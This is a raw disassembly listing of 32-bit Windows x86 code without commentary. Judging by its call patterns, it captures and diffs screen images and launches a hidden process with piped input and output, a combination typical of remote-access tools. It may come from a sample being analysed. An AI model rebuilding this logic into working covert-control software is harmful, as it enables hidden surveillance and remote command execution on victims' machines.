  4079dc:	89 56 14             	mov    %edx,0x14(%esi)
  4079df:	0f 8d 8f 00 00 00    	jge    0x407a74
  4079e5:	53                   	push   %ebx
  4079e6:	ff 15 54 b3 40 00    	call   *0x40b354
  4079ec:	8b f8                	mov    %eax,%edi
  4079ee:	6a 01                	push   $0x1
  4079f0:	6a 01                	push   $0x1
  4079f2:	57                   	push   %edi
  4079f3:	ff 15 8c b0 40 00    	call   *0x40b08c
  4079f9:	6a 00                	push   $0x0
  4079fb:	56                   	push   %esi
  4079fc:	6a 00                	push   $0x0
  4079fe:	8b d8                	mov    %eax,%ebx
  407a00:	6a 00                	push   $0x0
  407a02:	6a 00                	push   $0x0
  407a04:	53                   	push   %ebx
  407a05:	57                   	push   %edi
  407a06:	ff 15 a4 b0 40 00    	call   *0x40b0a4
  407a0c:	57                   	push   %edi
  407a0d:	6a 00                	push   $0x0
  407a0f:	ff 15 4c b3 40 00    	call   *0x40b34c
  407a15:	53                   	push   %ebx
  407a16:	ff 15 94 b0 40 00    	call   *0x40b094
  407a1c:	8b 44 24 10          	mov    0x10(%esp),%eax
  407a20:	8a 48 0c             	mov    0xc(%eax),%cl
  407a23:	84 c9                	test   %cl,%cl
  407a25:	74 4d                	je     0x407a74
  407a27:	85 ed                	test   %ebp,%ebp
  407a29:	7e 49                	jle    0x407a74
  407a2b:	8d 46 29             	lea    0x29(%esi),%eax
  407a2e:	8b fd                	mov    %ebp,%edi
  407a30:	33 c9                	xor    %ecx,%ecx
  407a32:	8a 08                	mov    (%eax),%cl
  407a34:	83 c0 04             	add    $0x4,%eax
  407a37:	8d 14 49             	lea    (%ecx,%ecx,2),%edx
  407a3a:	8d 14 92             	lea    (%edx,%edx,4),%edx
  407a3d:	8d 14 92             	lea    (%edx,%edx,4),%edx
  407a40:	8d 1c d1             	lea    (%ecx,%edx,8),%ebx
  407a43:	33 d2                	xor    %edx,%edx
  407a45:	8a 50 fd             	mov    -0x3(%eax),%dl
  407a48:	8b ca                	mov    %edx,%ecx
  407a4a:	c1 e1 04             	shl    $0x4,%ecx
  407a4d:	03 ca                	add    %edx,%ecx
  407a4f:	33 d2                	xor    %edx,%edx
  407a51:	8a 50 fb             	mov    -0x5(%eax),%dl
  407a54:	8d 0c c9             	lea    (%ecx,%ecx,8),%ecx
  407a57:	8d 0c 4b             	lea    (%ebx,%ecx,2),%ecx
  407a5a:	8d 1c 52             	lea    (%edx,%edx,2),%ebx
  407a5d:	8d 14 9a             	lea    (%edx,%ebx,4),%edx
  407a60:	8d 14 d2             	lea    (%edx,%edx,8),%edx
  407a63:	03 ca                	add    %edx,%ecx
  407a65:	c1 f9 0a             	sar    $0xa,%ecx
  407a68:	88 48 fb             	mov    %cl,-0x5(%eax)
  407a6b:	88 48 fc             	mov    %cl,-0x4(%eax)
  407a6e:	88 48 fd             	mov    %cl,-0x3(%eax)
  407a71:	4f                   	dec    %edi
  407a72:	75 bc                	jne    0x407a30
  407a74:	8b c6                	mov    %esi,%eax
  407a76:	5f                   	pop    %edi
  407a77:	5e                   	pop    %esi
  407a78:	5d                   	pop    %ebp
  407a79:	5b                   	pop    %ebx
  407a7a:	59                   	pop    %ecx
  407a7b:	c2 0c 00             	ret    $0xc
  407a7e:	90                   	nop
  407a7f:	90                   	nop
  407a80:	8b 54 24 08          	mov    0x8(%esp),%edx
  407a84:	53                   	push   %ebx
  407a85:	8b c1                	mov    %ecx,%eax
  407a87:	56                   	push   %esi
  407a88:	8b 74 24 0c          	mov    0xc(%esp),%esi
  407a8c:	57                   	push   %edi
  407a8d:	8b 78 1c             	mov    0x1c(%eax),%edi
  407a90:	8b 58 20             	mov    0x20(%eax),%ebx
  407a93:	8b ca                	mov    %edx,%ecx
  407a95:	03 fb                	add    %ebx,%edi
  407a97:	8b d9                	mov    %ecx,%ebx
  407a99:	c1 e9 02             	shr    $0x2,%ecx
  407a9c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407a9e:	8b cb                	mov    %ebx,%ecx
  407aa0:	83 e1 03             	and    $0x3,%ecx
  407aa3:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  407aa5:	8b 48 20             	mov    0x20(%eax),%ecx
  407aa8:	5f                   	pop    %edi
  407aa9:	03 ca                	add    %edx,%ecx
  407aab:	5e                   	pop    %esi
  407aac:	89 48 20             	mov    %ecx,0x20(%eax)
  407aaf:	5b                   	pop    %ebx
  407ab0:	c2 08 00             	ret    $0x8
  407ab3:	90                   	nop
  407ab4:	90                   	nop
  407ab5:	90                   	nop
  407ab6:	90                   	nop
  407ab7:	90                   	nop
  407ab8:	90                   	nop
  407ab9:	90                   	nop
  407aba:	90                   	nop
  407abb:	90                   	nop
  407abc:	90                   	nop
  407abd:	90                   	nop
  407abe:	90                   	nop
  407abf:	90                   	nop
  407ac0:	56                   	push   %esi
  407ac1:	8b f1                	mov    %ecx,%esi
  407ac3:	8b 46 10             	mov    0x10(%esi),%eax
  407ac6:	8b 4e 44             	mov    0x44(%esi),%ecx
  407ac9:	8b 56 2c             	mov    0x2c(%esi),%edx
  407acc:	50                   	push   %eax
  407acd:	8b 46 28             	mov    0x28(%esi),%eax
  407ad0:	6a 00                	push   $0x0
  407ad2:	6a 00                	push   $0x0
  407ad4:	51                   	push   %ecx
  407ad5:	8b 4e 4c             	mov    0x4c(%esi),%ecx
  407ad8:	52                   	push   %edx
  407ad9:	50                   	push   %eax
  407ada:	6a 00                	push   $0x0
  407adc:	6a 00                	push   $0x0
  407ade:	51                   	push   %ecx
  407adf:	ff 15 a0 b0 40 00    	call   *0x40b0a0
  407ae5:	8b 46 60             	mov    0x60(%esi),%eax
  407ae8:	5e                   	pop    %esi
  407ae9:	c3                   	ret
  407aea:	90                   	nop
  407aeb:	90                   	nop
  407aec:	90                   	nop
  407aed:	90                   	nop
  407aee:	90                   	nop
  407aef:	90                   	nop
  407af0:	51                   	push   %ecx
  407af1:	53                   	push   %ebx
  407af2:	55                   	push   %ebp
  407af3:	56                   	push   %esi
  407af4:	57                   	push   %edi
  407af5:	8b 7c 24 18          	mov    0x18(%esp),%edi
  407af9:	8b f1                	mov    %ecx,%esi
  407afb:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  407b02:	00 
  407b03:	6a 00                	push   $0x0
  407b05:	8b 5f 08             	mov    0x8(%edi),%ebx
  407b08:	8b 2f                	mov    (%edi),%ebp
  407b0a:	8b 46 6c             	mov    0x6c(%esi),%eax
  407b0d:	8b 57 04             	mov    0x4(%edi),%edx
  407b10:	2b dd                	sub    %ebp,%ebx
  407b12:	8b 6f 0c             	mov    0xc(%edi),%ebp
  407b15:	89 58 04             	mov    %ebx,0x4(%eax)
  407b18:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  407b1b:	2b ea                	sub    %edx,%ebp
  407b1d:	33 d2                	xor    %edx,%edx
  407b1f:	89 69 08             	mov    %ebp,0x8(%ecx)
  407b22:	8b 46 6c             	mov    0x6c(%esi),%eax
  407b25:	6a 00                	push   $0x0
  407b27:	66 8b 50 0e          	mov    0xe(%eax),%dx
  407b2b:	0f af 50 04          	imul   0x4(%eax),%edx
  407b2f:	83 c2 1f             	add    $0x1f,%edx
  407b32:	c1 fa 03             	sar    $0x3,%edx
  407b35:	83 e2 fc             	and    $0xfffffffc,%edx
  407b38:	0f af 50 08          	imul   0x8(%eax),%edx
  407b3c:	89 50 14             	mov    %edx,0x14(%eax)
  407b3f:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  407b42:	8b 56 44             	mov    0x44(%esi),%edx
  407b45:	8d 44 24 20          	lea    0x20(%esp),%eax
  407b49:	50                   	push   %eax
  407b4a:	6a 00                	push   $0x0
  407b4c:	51                   	push   %ecx
  407b4d:	52                   	push   %edx
  407b4e:	ff 15 9c b0 40 00    	call   *0x40b09c
  407b54:	89 44 24 10          	mov    %eax,0x10(%esp)
  407b58:	50                   	push   %eax
  407b59:	8b 46 50             	mov    0x50(%esi),%eax
  407b5c:	50                   	push   %eax
  407b5d:	ff 15 a8 b0 40 00    	call   *0x40b0a8
  407b63:	8b 56 10             	mov    0x10(%esi),%edx
  407b66:	8b 47 04             	mov    0x4(%edi),%eax
  407b69:	8b 0f                	mov    (%edi),%ecx
  407b6b:	52                   	push   %edx
  407b6c:	8b 56 44             	mov    0x44(%esi),%edx
  407b6f:	50                   	push   %eax
  407b70:	51                   	push   %ecx
  407b71:	52                   	push   %edx
  407b72:	55                   	push   %ebp
  407b73:	53                   	push   %ebx
  407b74:	50                   	push   %eax
  407b75:	8b 46 4c             	mov    0x4c(%esi),%eax
  407b78:	51                   	push   %ecx
  407b79:	50                   	push   %eax
  407b7a:	ff 15 a0 b0 40 00    	call   *0x40b0a0
  407b80:	8b 4f 04             	mov    0x4(%edi),%ecx
  407b83:	8b 17                	mov    (%edi),%edx
  407b85:	8b 46 4c             	mov    0x4c(%esi),%eax
  407b88:	68 20 00 cc 00       	push   $0xcc0020
  407b8d:	51                   	push   %ecx
  407b8e:	8b 4e 50             	mov    0x50(%esi),%ecx
  407b91:	52                   	push   %edx
  407b92:	50                   	push   %eax
  407b93:	55                   	push   %ebp
  407b94:	53                   	push   %ebx
  407b95:	6a 00                	push   $0x0
  407b97:	6a 00                	push   $0x0
  407b99:	51                   	push   %ecx
  407b9a:	ff 15 a0 b0 40 00    	call   *0x40b0a0
  407ba0:	6a 10                	push   $0x10
  407ba2:	57                   	push   %edi
  407ba3:	8b ce                	mov    %esi,%ecx
  407ba5:	e8 d6 fe ff ff       	call   0x407a80
  407baa:	8b 56 6c             	mov    0x6c(%esi),%edx
  407bad:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  407bb1:	8b 42 14             	mov    0x14(%edx),%eax
  407bb4:	50                   	push   %eax
  407bb5:	51                   	push   %ecx
  407bb6:	8b ce                	mov    %esi,%ecx
  407bb8:	e8 c3 fe ff ff       	call   0x407a80
  407bbd:	8b 54 24 10          	mov    0x10(%esp),%edx
  407bc1:	52                   	push   %edx
  407bc2:	ff 15 94 b0 40 00    	call   *0x40b094
  407bc8:	5f                   	pop    %edi
  407bc9:	5e                   	pop    %esi
  407bca:	5d                   	pop    %ebp
  407bcb:	5b                   	pop    %ebx
  407bcc:	59                   	pop    %ecx
  407bcd:	c2 04 00             	ret    $0x4
  407bd0:	8b 41 68             	mov    0x68(%ecx),%eax
  407bd3:	8b 40 14             	mov    0x14(%eax),%eax
  407bd6:	c3                   	ret
  407bd7:	90                   	nop
  407bd8:	90                   	nop
  407bd9:	90                   	nop
  407bda:	90                   	nop
  407bdb:	90                   	nop
  407bdc:	90                   	nop
  407bdd:	90                   	nop
  407bde:	90                   	nop
  407bdf:	90                   	nop
  407be0:	8a 54 24 04          	mov    0x4(%esp),%dl
  407be4:	b8 20 00 cc 00       	mov    $0xcc0020,%eax
  407be9:	84 d2                	test   %dl,%dl
  407beb:	74 05                	je     0x407bf2
  407bed:	b8 20 00 cc 40       	mov    $0x40cc0020,%eax
  407bf2:	83 c1 10             	add    $0x10,%ecx
  407bf5:	50                   	push   %eax
  407bf6:	51                   	push   %ecx
  407bf7:	ff 15 bc b0 40 00    	call   *0x40b0bc
  407bfd:	c2 04 00             	ret    $0x4
  407c00:	8b 41 68             	mov    0x68(%ecx),%eax
  407c03:	c3                   	ret
  407c04:	90                   	nop
  407c05:	90                   	nop
  407c06:	90                   	nop
  407c07:	90                   	nop
  407c08:	90                   	nop
  407c09:	90                   	nop
  407c0a:	90                   	nop
  407c0b:	90                   	nop
  407c0c:	90                   	nop
  407c0d:	90                   	nop
  407c0e:	90                   	nop
  407c0f:	90                   	nop
  407c10:	8b 49 70             	mov    0x70(%ecx),%ecx
  407c13:	83 f9 08             	cmp    $0x8,%ecx
  407c16:	7f 0f                	jg     0x407c27
  407c18:	b8 01 00 00 00       	mov    $0x1,%eax
  407c1d:	d3 e0                	shl    %cl,%eax
  407c1f:	8d 04 85 28 00 00 00 	lea    0x28(,%eax,4),%eax
  407c26:	c3                   	ret
  407c27:	33 c0                	xor    %eax,%eax
  407c29:	8d 04 85 28 00 00 00 	lea    0x28(,%eax,4),%eax
  407c30:	c3                   	ret
  407c31:	90                   	nop
  407c32:	90                   	nop
  407c33:	90                   	nop
  407c34:	90                   	nop
  407c35:	90                   	nop
  407c36:	90                   	nop
  407c37:	90                   	nop
  407c38:	90                   	nop
  407c39:	90                   	nop
  407c3a:	90                   	nop
  407c3b:	90                   	nop
  407c3c:	90                   	nop
  407c3d:	90                   	nop
  407c3e:	90                   	nop
  407c3f:	90                   	nop
  407c40:	53                   	push   %ebx
  407c41:	56                   	push   %esi
  407c42:	8b f1                	mov    %ecx,%esi
  407c44:	e8 87 1c 00 00       	call   0x4098d0
  407c49:	8a d8                	mov    %al,%bl
  407c4b:	84 db                	test   %bl,%bl
  407c4d:	74 27                	je     0x407c76
  407c4f:	8b 46 44             	mov    0x44(%esi),%eax
  407c52:	8b 8e 0c 01 00 00    	mov    0x10c(%esi),%ecx
  407c58:	50                   	push   %eax
  407c59:	51                   	push   %ecx
  407c5a:	ff 15 4c b3 40 00    	call   *0x40b34c
  407c60:	ff 15 50 b3 40 00    	call   *0x40b350
  407c66:	50                   	push   %eax
  407c67:	89 86 0c 01 00 00    	mov    %eax,0x10c(%esi)
  407c6d:	ff 15 54 b3 40 00    	call   *0x40b354
  407c73:	89 46 44             	mov    %eax,0x44(%esi)
  407c76:	8a c3                	mov    %bl,%al
  407c78:	5e                   	pop    %esi
  407c79:	5b                   	pop    %ebx
  407c7a:	c3                   	ret
  407c7b:	90                   	nop
  407c7c:	90                   	nop
  407c7d:	90                   	nop
  407c7e:	90                   	nop
  407c7f:	90                   	nop
  407c80:	53                   	push   %ebx
  407c81:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  407c85:	55                   	push   %ebp
  407c86:	56                   	push   %esi
  407c87:	33 f6                	xor    %esi,%esi
  407c89:	8b e9                	mov    %ecx,%ebp
  407c8b:	85 db                	test   %ebx,%ebx
  407c8d:	7e 3e                	jle    0x407ccd
  407c8f:	57                   	push   %edi
  407c90:	8b fb                	mov    %ebx,%edi
  407c92:	2b fe                	sub    %esi,%edi
  407c94:	83 ff 32             	cmp    $0x32,%edi
  407c97:	76 05                	jbe    0x407c9e
  407c99:	bf 32 00 00 00       	mov    $0x32,%edi
  407c9e:	8b 45 10             	mov    0x10(%ebp),%eax
  407ca1:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  407ca5:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  407ca9:	50                   	push   %eax
  407caa:	8b 44 24 18          	mov    0x18(%esp),%eax
  407cae:	56                   	push   %esi
  407caf:	6a 00                	push   $0x0
  407cb1:	51                   	push   %ecx
  407cb2:	57                   	push   %edi
  407cb3:	52                   	push   %edx
  407cb4:	56                   	push   %esi
  407cb5:	6a 00                	push   $0x0
  407cb7:	50                   	push   %eax
  407cb8:	ff 15 a0 b0 40 00    	call   *0x40b0a0
  407cbe:	6a 05                	push   $0x5
  407cc0:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  407cc6:	03 f7                	add    %edi,%esi
  407cc8:	3b f3                	cmp    %ebx,%esi
  407cca:	7c c4                	jl     0x407c90
  407ccc:	5f                   	pop    %edi
  407ccd:	5e                   	pop    %esi
  407cce:	5d                   	pop    %ebp
  407ccf:	5b                   	pop    %ebx
  407cd0:	c2 10 00             	ret    $0x10
  407cd3:	90                   	nop
  407cd4:	90                   	nop
  407cd5:	90                   	nop
  407cd6:	90                   	nop
  407cd7:	90                   	nop
  407cd8:	90                   	nop
  407cd9:	90                   	nop
  407cda:	90                   	nop
  407cdb:	90                   	nop
  407cdc:	90                   	nop
  407cdd:	90                   	nop
  407cde:	90                   	nop
  407cdf:	90                   	nop
  407ce0:	8b 44 24 10          	mov    0x10(%esp),%eax
  407ce4:	8b 54 24 08          	mov    0x8(%esp),%edx
  407ce8:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  407cec:	55                   	push   %ebp
  407ced:	56                   	push   %esi
  407cee:	33 ed                	xor    %ebp,%ebp
  407cf0:	33 f6                	xor    %esi,%esi
  407cf2:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  407cf6:	85 c0                	test   %eax,%eax
  407cf8:	0f 86 81 00 00 00    	jbe    0x407d7f
  407cfe:	53                   	push   %ebx
  407cff:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  407d03:	57                   	push   %edi
  407d04:	8b 3a                	mov    (%edx),%edi
  407d06:	3b 39                	cmp    (%ecx),%edi
  407d08:	74 5f                	je     0x407d69
  407d0a:	89 34 2b             	mov    %esi,(%ebx,%ebp,1)
  407d0d:	8b 39                	mov    (%ecx),%edi
  407d0f:	89 3a                	mov    %edi,(%edx)
  407d11:	8b 39                	mov    (%ecx),%edi
  407d13:	8d 6c 2b 08          	lea    0x8(%ebx,%ebp,1),%ebp
  407d17:	89 7d 00             	mov    %edi,0x0(%ebp)
  407d1a:	bf 04 00 00 00       	mov    $0x4,%edi
  407d1f:	03 f7                	add    %edi,%esi
  407d21:	03 d7                	add    %edi,%edx
  407d23:	03 cf                	add    %edi,%ecx
  407d25:	3b f0                	cmp    %eax,%esi
  407d27:	8b de                	mov    %esi,%ebx
  407d29:	73 2a                	jae    0x407d55
  407d2b:	8b 01                	mov    (%ecx),%eax
  407d2d:	39 02                	cmp    %eax,(%edx)
  407d2f:	74 20                	je     0x407d51
  407d31:	89 02                	mov    %eax,(%edx)
  407d33:	8b 01                	mov    (%ecx),%eax
  407d35:	89 04 2f             	mov    %eax,(%edi,%ebp,1)
  407d38:	8b 44 24 20          	mov    0x20(%esp),%eax
  407d3c:	83 c3 04             	add    $0x4,%ebx
  407d3f:	83 c7 04             	add    $0x4,%edi
  407d42:	83 c6 04             	add    $0x4,%esi
  407d45:	83 c2 04             	add    $0x4,%edx
  407d48:	83 c1 04             	add    $0x4,%ecx
  407d4b:	3b d8                	cmp    %eax,%ebx
  407d4d:	72 dc                	jb     0x407d2b
  407d4f:	eb 04                	jmp    0x407d55
  407d51:	8b 44 24 20          	mov    0x20(%esp),%eax
  407d55:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  407d59:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  407d5d:	89 7c 2b 04          	mov    %edi,0x4(%ebx,%ebp,1)
  407d61:	8d 6c 2f 08          	lea    0x8(%edi,%ebp,1),%ebp
  407d65:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  407d69:	83 c6 04             	add    $0x4,%esi
  407d6c:	83 c2 04             	add    $0x4,%edx
  407d6f:	83 c1 04             	add    $0x4,%ecx
  407d72:	3b f0                	cmp    %eax,%esi
  407d74:	72 8e                	jb     0x407d04
  407d76:	5f                   	pop    %edi
  407d77:	5b                   	pop    %ebx
  407d78:	8b c5                	mov    %ebp,%eax
  407d7a:	5e                   	pop    %esi
  407d7b:	5d                   	pop    %ebp
  407d7c:	c2 10 00             	ret    $0x10
  407d7f:	8b c5                	mov    %ebp,%eax
  407d81:	5e                   	pop    %esi
  407d82:	5d                   	pop    %ebp
  407d83:	c2 10 00             	ret    $0x10
  407d86:	90                   	nop
  407d87:	90                   	nop
  407d88:	90                   	nop
  407d89:	90                   	nop
  407d8a:	90                   	nop
  407d8b:	90                   	nop
  407d8c:	90                   	nop
  407d8d:	90                   	nop
  407d8e:	90                   	nop
  407d8f:	90                   	nop
  407d90:	6a ff                	push   $0xffffffff
  407d92:	68 2b ad 40 00       	push   $0x40ad2b
  407d97:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407d9d:	50                   	push   %eax
  407d9e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  407da5:	81 ec 6c 01 00 00    	sub    $0x16c,%esp
  407dab:	8b 84 24 7c 01 00 00 	mov    0x17c(%esp),%eax
  407db2:	53                   	push   %ebx
  407db3:	55                   	push   %ebp
  407db4:	56                   	push   %esi
  407db5:	57                   	push   %edi
  407db6:	8b e9                	mov    %ecx,%ebp
  407db8:	50                   	push   %eax
  407db9:	89 6c 24 34          	mov    %ebp,0x34(%esp)
  407dbd:	e8 5e e1 ff ff       	call   0x405f20
  407dc2:	33 c9                	xor    %ecx,%ecx
  407dc4:	33 d2                	xor    %edx,%edx
  407dc6:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  407dca:	33 c0                	xor    %eax,%eax
  407dcc:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  407dd0:	b9 10 00 00 00       	mov    $0x10,%ecx
  407dd5:	8d 7c 24 38          	lea    0x38(%esp),%edi
  407dd9:	89 54 24 34          	mov    %edx,0x34(%esp)
  407ddd:	f3 ab                	rep stos %eax,%es:(%edi)
  407ddf:	89 44 24 18          	mov    %eax,0x18(%esp)
  407de3:	b9 40 00 00 00       	mov    $0x40,%ecx
  407de8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  407dec:	8d 7c 24 79          	lea    0x79(%esp),%edi
  407df0:	89 44 24 20          	mov    %eax,0x20(%esp)
  407df4:	88 44 24 78          	mov    %al,0x78(%esp)
  407df8:	f3 ab                	rep stos %eax,%es:(%edi)
  407dfa:	66 ab                	stos   %ax,%es:(%edi)
  407dfc:	aa                   	stos   %al,%es:(%edi)
  407dfd:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  407e01:	8d 5d 1c             	lea    0x1c(%ebp),%ebx
  407e04:	52                   	push   %edx
  407e05:	8d 7d 10             	lea    0x10(%ebp),%edi
  407e08:	8d 75 18             	lea    0x18(%ebp),%esi
  407e0b:	51                   	push   %ecx
  407e0c:	53                   	push   %ebx
  407e0d:	57                   	push   %edi
  407e0e:	89 94 24 94 01 00 00 	mov    %edx,0x194(%esp)
  407e15:	c7 45 00 dc b4 40 00 	movl   $0x40b4dc,0x0(%ebp)
  407e1c:	89 54 24 24          	mov    %edx,0x24(%esp)
  407e20:	89 17                	mov    %edx,(%edi)
  407e22:	89 55 14             	mov    %edx,0x14(%ebp)
  407e25:	89 16                	mov    %edx,(%esi)
  407e27:	89 13                	mov    %edx,(%ebx)
  407e29:	c7 44 24 34 0c 00 00 	movl   $0xc,0x34(%esp)
  407e30:	00 
  407e31:	89 54 24 38          	mov    %edx,0x38(%esp)
  407e35:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  407e3c:	00 
  407e3d:	ff 15 98 b1 40 00    	call   *0x40b198
  407e43:	85 c0                	test   %eax,%eax
  407e45:	75 21                	jne    0x407e68
  407e47:	8b 3f                	mov    (%edi),%edi
  407e49:	8b 35 e4 b1 40 00    	mov    0x40b1e4,%esi
  407e4f:	85 ff                	test   %edi,%edi
  407e51:	74 03                	je     0x407e56
  407e53:	57                   	push   %edi
  407e54:	ff d6                	call   *%esi
  407e56:	8b 1b                	mov    (%ebx),%ebx
  407e58:	85 db                	test   %ebx,%ebx
  407e5a:	0f 84 6d 01 00 00    	je     0x407fcd
  407e60:	53                   	push   %ebx
  407e61:	ff d6                	call   *%esi
  407e63:	e9 65 01 00 00       	jmp    0x407fcd
  407e68:	8d 54 24 24          	lea    0x24(%esp),%edx
  407e6c:	6a 00                	push   $0x0
  407e6e:	8d 7d 14             	lea    0x14(%ebp),%edi
  407e71:	52                   	push   %edx
  407e72:	57                   	push   %edi
  407e73:	56                   	push   %esi
  407e74:	ff 15 98 b1 40 00    	call   *0x40b198
  407e7a:	85 c0                	test   %eax,%eax
  407e7c:	75 21                	jne    0x407e9f
  407e7e:	8b 3f                	mov    (%edi),%edi
  407e80:	8b 1d e4 b1 40 00    	mov    0x40b1e4,%ebx
  407e86:	85 ff                	test   %edi,%edi
  407e88:	74 03                	je     0x407e8d
  407e8a:	57                   	push   %edi
  407e8b:	ff d3                	call   *%ebx
  407e8d:	8b 36                	mov    (%esi),%esi
  407e8f:	85 f6                	test   %esi,%esi
  407e91:	0f 84 36 01 00 00    	je     0x407fcd
  407e97:	56                   	push   %esi
  407e98:	ff d3                	call   *%ebx
  407e9a:	e9 2e 01 00 00       	jmp    0x407fcd
  407e9f:	b9 11 00 00 00       	mov    $0x11,%ecx
  407ea4:	33 c0                	xor    %eax,%eax
  407ea6:	8d 7c 24 34          	lea    0x34(%esp),%edi
  407eaa:	f3 ab                	rep stos %eax,%es:(%edi)
  407eac:	89 44 24 14          	mov    %eax,0x14(%esp)
  407eb0:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  407eb4:	89 44 24 18          	mov    %eax,0x18(%esp)
  407eb8:	51                   	push   %ecx
  407eb9:	89 44 24 20          	mov    %eax,0x20(%esp)
  407ebd:	89 44 24 24          	mov    %eax,0x24(%esp)
  407ec1:	ff 15 94 b1 40 00    	call   *0x40b194
  407ec7:	8b 03                	mov    (%ebx),%eax
  407ec9:	8b 16                	mov    (%esi),%edx
  407ecb:	89 44 24 74          	mov    %eax,0x74(%esp)
  407ecf:	89 44 24 70          	mov    %eax,0x70(%esp)
  407ed3:	8d 44 24 78          	lea    0x78(%esp),%eax
  407ed7:	68 04 01 00 00       	push   $0x104
  407edc:	50                   	push   %eax
  407edd:	c7 44 24 3c 44 00 00 	movl   $0x44,0x3c(%esp)
  407ee4:	00 
  407ee5:	66 c7 44 24 6c 00 00 	movw   $0x0,0x6c(%esp)
  407eec:	c7 44 24 68 01 01 00 	movl   $0x101,0x68(%esp)
  407ef3:	00 
  407ef4:	89 54 24 74          	mov    %edx,0x74(%esp)
  407ef8:	ff 15 f4 b1 40 00    	call   *0x40b1f4
  407efe:	bf 04 e4 40 00       	mov    $0x40e404,%edi
  407f03:	83 c9 ff             	or     $0xffffffff,%ecx
  407f06:	33 c0                	xor    %eax,%eax
  407f08:	8d 54 24 78          	lea    0x78(%esp),%edx
  407f0c:	f2 ae                	repnz scas %es:(%edi),%al
  407f0e:	f7 d1                	not    %ecx
  407f10:	2b f9                	sub    %ecx,%edi
  407f12:	8b f7                	mov    %edi,%esi
  407f14:	8b fa                	mov    %edx,%edi
  407f16:	8b d1                	mov    %ecx,%edx
  407f18:	83 c9 ff             	or     $0xffffffff,%ecx
  407f1b:	f2 ae                	repnz scas %es:(%edi),%al
  407f1d:	8b ca                	mov    %edx,%ecx
  407f1f:	4f                   	dec    %edi
  407f20:	c1 e9 02             	shr    $0x2,%ecx
  407f23:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407f25:	8b ca                	mov    %edx,%ecx
  407f27:	8d 44 24 14          	lea    0x14(%esp),%eax
  407f2b:	83 e1 03             	and    $0x3,%ecx
  407f2e:	50                   	push   %eax
  407f2f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  407f31:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  407f35:	8d 54 24 7c          	lea    0x7c(%esp),%edx
  407f39:	51                   	push   %ecx
  407f3a:	6a 00                	push   $0x0
  407f3c:	6a 00                	push   $0x0
  407f3e:	6a 20                	push   $0x20
  407f40:	6a 01                	push   $0x1
  407f42:	6a 00                	push   $0x0
  407f44:	6a 00                	push   $0x0
  407f46:	6a 00                	push   $0x0
  407f48:	52                   	push   %edx
  407f49:	ff 15 0c b1 40 00    	call   *0x40b10c
  407f4f:	85 c0                	test   %eax,%eax
  407f51:	75 1f                	jne    0x407f72
  407f53:	8b 45 10             	mov    0x10(%ebp),%eax
  407f56:	8b 35 e4 b1 40 00    	mov    0x40b1e4,%esi
  407f5c:	50                   	push   %eax
  407f5d:	ff d6                	call   *%esi
  407f5f:	8b 4d 14             	mov    0x14(%ebp),%ecx
  407f62:	51                   	push   %ecx
  407f63:	ff d6                	call   *%esi
  407f65:	8b 55 18             	mov    0x18(%ebp),%edx
  407f68:	52                   	push   %edx
  407f69:	ff d6                	call   *%esi
  407f6b:	8b 03                	mov    (%ebx),%eax
  407f6d:	50                   	push   %eax
  407f6e:	ff d6                	call   *%esi
  407f70:	eb 5b                	jmp    0x407fcd
  407f72:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407f76:	8b 54 24 18          	mov    0x18(%esp),%edx
  407f7a:	8d 44 24 13          	lea    0x13(%esp),%eax
  407f7e:	89 4d 20             	mov    %ecx,0x20(%ebp)
  407f81:	6a 01                	push   $0x1
  407f83:	50                   	push   %eax
  407f84:	8b cd                	mov    %ebp,%ecx
  407f86:	89 55 24             	mov    %edx,0x24(%ebp)
  407f89:	c6 44 24 1b 80       	movb   $0x80,0x1b(%esp)
  407f8e:	e8 0d e0 ff ff       	call   0x405fa0
  407f93:	8b cd                	mov    %ebp,%ecx
  407f95:	e8 76 e0 ff ff       	call   0x406010
  407f9a:	6a 00                	push   $0x0
  407f9c:	6a 00                	push   $0x0
  407f9e:	6a 00                	push   $0x0
  407fa0:	55                   	push   %ebp
  407fa1:	68 10 81 40 00       	push   $0x408110
  407fa6:	6a 00                	push   $0x0
  407fa8:	6a 00                	push   $0x0
  407faa:	e8 c1 15 00 00       	call   0x409570
  407faf:	6a 00                	push   $0x0
  407fb1:	6a 00                	push   $0x0
  407fb3:	6a 00                	push   $0x0
  407fb5:	55                   	push   %ebp
  407fb6:	68 d0 81 40 00       	push   $0x4081d0
  407fbb:	6a 00                	push   $0x0
  407fbd:	6a 00                	push   $0x0
  407fbf:	89 45 28             	mov    %eax,0x28(%ebp)
  407fc2:	e8 a9 15 00 00       	call   0x409570
  407fc7:	83 c4 38             	add    $0x38,%esp
  407fca:	89 45 2c             	mov    %eax,0x2c(%ebp)
  407fcd:	8b 8c 24 7c 01 00 00 	mov    0x17c(%esp),%ecx
  407fd4:	5f                   	pop    %edi
  407fd5:	8b c5                	mov    %ebp,%eax
  407fd7:	5e                   	pop    %esi
  407fd8:	5d                   	pop    %ebp
  407fd9:	5b                   	pop    %ebx
  407fda:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
